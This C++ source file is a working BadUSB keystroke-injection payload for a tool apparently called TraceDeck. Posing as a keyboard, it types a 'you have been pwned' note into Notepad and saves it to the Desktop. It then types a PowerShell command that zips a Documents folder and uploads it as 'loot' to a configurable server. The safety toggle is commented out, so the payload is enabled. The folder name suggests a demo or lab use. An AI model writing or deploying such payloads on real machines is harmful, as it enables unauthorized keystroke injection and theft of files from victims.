#include "DropUpload.h"
#include <Keyboard.h>
#include "../../DisabledPayload.h"

#define TRACEDECK_STRINGIFY_LITERAL(value) #value
#define TRACEDECK_STRINGIFY(value) TRACEDECK_STRINGIFY_LITERAL(value)

namespace{
    // Delay for a file dialog (Save As / Select Folder) to open or navigate.
    constexpr uint32_t kDialogWaitMs = 1750;
    // Delay for Notepad to launch after Win+R and typing "notepad.exe".
    constexpr uint32_t kNotepadLaunchWaitMs = 2500;
    // Delay for Notepad to settle after the save completes.
    constexpr uint32_t kNotepadSaveWaitMs = 2500;
    // Delay for the visible PowerShell window to open.
    constexpr uint32_t kPowerShellLaunchWaitMs = 2500;
    constexpr uint32_t kShortcutHoldMs = 75;
    // Total delays in each phase, for the progress bar.
    constexpr uint32_t kNotepadTotalWaitMs = kNotepadLaunchWaitMs + 6 * kDialogWaitMs + kNotepadSaveWaitMs;
    constexpr uint32_t kUploadTotalWaitMs = kPowerShellLaunchWaitMs + kDialogWaitMs;
    // Refresh the progress bar every 125 ms.
    constexpr uint32_t kProgressRefreshMs = 125;

#ifdef TRACEHUB_SERVER_IP
    constexpr char kTraceHubUploadUrl[] =
        "http://" TRACEDECK_STRINGIFY(TRACEHUB_SERVER_IP) ":8080/badusb/upload";
#else
    constexpr char kTraceHubUploadUrl[] = "";
#endif

    struct TimedProgress
    {
        const BadUsbProgress &progress;
        uint32_t totalMs;
        uint32_t completedMs;

        void wait(uint32_t duration)
        {
            const uint32_t startedAt = millis();
            uint32_t elapsed = 0;
            while (elapsed < duration)
            {
                const uint32_t remaining = duration - elapsed;
                delay(remaining < kProgressRefreshMs ? remaining : kProgressRefreshMs);
                elapsed = millis() - startedAt;
                const uint32_t waited = elapsed < duration ? elapsed : duration;
                // Reserve a full bar until the keyboard sequence returns.
                progress.update(progress.context, (completedMs + waited) * 99 / totalMs);
                elapsed = millis() - startedAt;
            }
            completedMs += duration;
        }
    };

    void pressShortcut(uint8_t modifier, uint8_t key)
    {
        Keyboard.press(modifier);
        Keyboard.press(key);
        delay(kShortcutHoldMs);
        Keyboard.releaseAll();
        delay(kShortcutHoldMs);
    }

    void openFromWindowsRun(const char *target, TimedProgress &timing)
    {
        pressShortcut(KEY_LEFT_GUI, 'r');
        timing.wait(kDialogWaitMs);
        pressShortcut(KEY_LEFT_CTRL, 'a');
        Keyboard.print(target);
        Keyboard.write(KEY_RETURN);
    }

    void enterFilePathInDialog(TimedProgress &timing)
    {
        // Give Save As a full filename so navigation focus cannot choose the location.
        pressShortcut(KEY_LEFT_ALT, 'n');
        timing.wait(kDialogWaitMs);
        pressShortcut(KEY_LEFT_CTRL, 'a');
        Keyboard.print("%USERPROFILE%\\Desktop\\TinyCircuitDemo.txt");
        Keyboard.write(KEY_RETURN);
    }

    void sendZipUploadCommand(TimedProgress &timing)
    {
        openFromWindowsRun("powershell.exe -NoProfile", timing);
        timing.wait(kPowerShellLaunchWaitMs);
        // Each attempt owns a fresh temporary directory. Keep its ZIP if upload fails.
        Keyboard.print(
            "$ErrorActionPreference='Stop'; "
            "Add-Type -AssemblyName System.Net.Http; "
            "Add-Type -AssemblyName System.IO.Compression.FileSystem; "
            "$folder=Join-Path $env:USERPROFILE 'Documents\\Test_Important'; "
            "$temporary=Join-Path $env:TEMP ('TraceDeck-'+[guid]::NewGuid()); "
            "New-Item -ItemType Directory -Path $temporary | Out-Null; "
            "$zip=Join-Path $temporary 'Test_Important.zip'; "
            "$client=[System.Net.Http.HttpClient]::new(); "
            "$client.Timeout=[TimeSpan]::FromSeconds(60); "
            "$form=[System.Net.Http.MultipartFormDataContent]::new(); "
            "try { "
            "[IO.Compression.ZipFile]::CreateFromDirectory($folder,$zip,[IO.Compression.CompressionLevel]::Optimal,$true); "
            "$form.Add([System.Net.Http.StringContent]::new([guid]::NewGuid().ToString()),'submission_id'); "
            "$form.Add([System.Net.Http.ByteArrayContent]::new([IO.File]::ReadAllBytes($zip)),'file','Test_Important.zip'); "
            "$client.DefaultRequestHeaders.Accept.ParseAdd('application/json'); "
            "$response=$client.PostAsync('"
        );
        Keyboard.print(kTraceHubUploadUrl);
        Keyboard.print(
            "',$form).GetAwaiter().GetResult(); "
            "$response.EnsureSuccessStatusCode() | Out-Null; "
            "$saved=$response.Content.ReadAsStringAsync().GetAwaiter().GetResult() | ConvertFrom-Json; "
            "$lootId=[guid]::Parse($saved.loot_id); "
            "if($lootId -eq [guid]::Empty){throw 'Missing loot ID'}; "
            "Remove-Item -LiteralPath $zip; Remove-Item -LiteralPath $temporary; "
            "Write-Host ('Saved loot '+$lootId+'; temporary ZIP deleted') -ForegroundColor Green "
            "} catch { Write-Host $_ -ForegroundColor Red; Write-Host ('ZIP retained if created: '+$zip) "
            "} finally { $form.Dispose(); $client.Dispose() }"
        );
        Keyboard.write(KEY_RETURN);
    }

    void sendNotepadSaveKeys(TimedProgress &timing)
    {
        openFromWindowsRun("notepad.exe", timing);
        timing.wait(kNotepadLaunchWaitMs);

        // Start a new document in case Notepad restored an earlier tab.
        pressShortcut(KEY_LEFT_CTRL, 'n');
        timing.wait(kDialogWaitMs);
        Keyboard.print("you have been pwned by TraceDeck");
        timing.wait(kDialogWaitMs);

        // Request Save As explicitly after the text has settled.
        Keyboard.press(KEY_LEFT_CTRL);
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.press('s');
        delay(kShortcutHoldMs);
        Keyboard.releaseAll();
        timing.wait(kDialogWaitMs);

        enterFilePathInDialog(timing);
        timing.wait(kNotepadSaveWaitMs);
        pressShortcut(KEY_LEFT_ALT, KEY_F4);
        timing.wait(kDialogWaitMs);
    }
}

void sendDropUploadKeys(const BadUsbProgress &progress)
{
    // Comment out BOTH lines below to enable this payload.
    // showDisabledPayload(progress);
    // return;
    
    const bool uploadEnabled = kTraceHubUploadUrl[0] != '\0';
    TimedProgress timing{progress, kNotepadTotalWaitMs + (uploadEnabled ? kUploadTotalWaitMs : 0), 0};
    Keyboard.begin(KeyboardLayout_en_US);
    sendNotepadSaveKeys(timing);

    if (!uploadEnabled)
    {
        return;
    }

    if (!USBDevice.configured())
    {
        return;
    }

    sendZipUploadCommand(timing);
}
